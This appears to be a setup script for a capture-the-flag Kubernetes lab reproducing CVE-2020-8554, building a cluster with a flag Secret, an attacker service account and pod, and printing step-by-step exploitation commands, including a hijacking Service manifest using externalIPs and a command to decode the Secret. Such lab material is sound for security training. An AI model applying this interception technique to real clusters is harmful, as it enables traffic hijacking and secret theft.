#!/bin/bash
set -euo pipefail
K8S_ID="k8s-22"
CLUSTER_NAME="cve-k8s-22-externalip"
source "$(dirname "$0")/../../scripts/k8s-common.sh"

echo "[K8S-22] CVE-2020-8554 Service ExternalIP Traffic Interception"
k8s_init
k8s_create_host_flag
k8s_create_cluster
k8s_wait_ready

echo "[*] Pre-loading container images into KIND..."
k8s_load_images alpine:latest nginx:1.24-alpine

echo "[*] Setting up namespaces and RBAC..."
k8s_apply << 'YAML'
---
apiVersion: v1
kind: Namespace
metadata:
  name: secure-ns
---
apiVersion: v1
kind: Namespace
metadata:
  name: attack-ns
---
# Attacker SA with Service creation permissions
apiVersion: v1
kind: ServiceAccount
metadata:
  name: attacker-sa
  namespace: attack-ns
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: service-creator
  namespace: attack-ns
rules:
  - apiGroups: [""]
    resources: ["services"]
    verbs: ["create", "get", "list", "delete"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: service-creator
  namespace: attack-ns
subjects:
  - kind: ServiceAccount
    name: attacker-sa
    namespace: attack-ns
roleRef:
  kind: Role
  name: service-creator
  apiGroup: rbac.authorization.k8s.io
YAML

echo "[*] Creating target service with flag-bearing client..."
# Store flag as a Secret in secure-ns
k8s_create_k8s_secret "target-flag" "secure-ns"

k8s_apply << 'YAML'
---
apiVersion: v1
kind: Service
metadata:
  name: internal-api
  namespace: secure-ns
spec:
  selector:
    app: internal-api
  ports:
    - port: 8080
      targetPort: 8080
  type: ClusterIP
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: internal-api
  namespace: secure-ns
spec:
  replicas: 1
  selector:
    matchLabels:
      app: internal-api
  template:
    metadata:
      labels:
        app: internal-api
    spec:
      containers:
        - name: api
          image: nginx:1.24-alpine
          imagePullPolicy: IfNotPresent
          command: ["sh", "-c"]
          args:
            - "printf 'server { listen 8080; location /health { return 200 ok; } location / { return 200; } }' > /etc/nginx/conf.d/default.conf && nginx -g 'daemon off;'"
          ports:
            - containerPort: 8080
---
# Attacker pod with netcat to capture intercepted traffic
apiVersion: v1
kind: Pod
metadata:
  name: attacker-pod
  namespace: attack-ns
spec:
  serviceAccountName: attacker-sa
  containers:
    - name: attacker
      image: nginx:1.24-alpine
      imagePullPolicy: IfNotPresent
      command: ["sh", "-c"]
      args:
        - "apk add --no-cache curl bash >/dev/null 2>&1 && echo attacker-ready && nginx -g 'daemon off;' & sleep 3600"
      ports:
        - containerPort: 8080
YAML

echo "[*] Waiting for pods..."
k8s_wait_pod "attacker-pod" "attack-ns"
k8s_wait_pods_label "app=internal-api" "secure-ns"
sleep 5

# Get the target service's ClusterIP for the hint
TARGET_IP=$(kubectl get svc internal-api -n secure-ns -o jsonpath='{.spec.clusterIP}')
k8s_info
echo "    Target Service ClusterIP: $TARGET_IP"
echo "    Flag Secret: target-flag in secure-ns namespace"
echo ""
echo "    Exploitation steps:"
echo "    1. Discover target service ClusterIP:"
echo "       kubectl get svc --all-namespaces"
echo "    2. Create a malicious service with externalIPs set to the target IP:"
echo "       kubectl apply -f - << 'EOF'"
echo "       apiVersion: v1"
echo "       kind: Service"
echo "       metadata:"
echo "         name: hijack-svc"
echo "         namespace: attack-ns"
echo "       spec:"
echo "         externalIPs:"
echo "           - $TARGET_IP"
echo "         selector:"
echo "           app: attacker"
echo "         ports:"
echo "           - port: 8080"
echo "             targetPort: 8080"
echo "       EOF"
echo "    3. All traffic to $TARGET_IP:8080 now routes to attacker's pods"
echo "    4. Intercept flag-bearing X-Flag header in captured requests"
echo "    5. Or read the flag Secret directly: kubectl get secret target-flag -n secure-ns -o jsonpath='{.data.flag}' | base64 -d"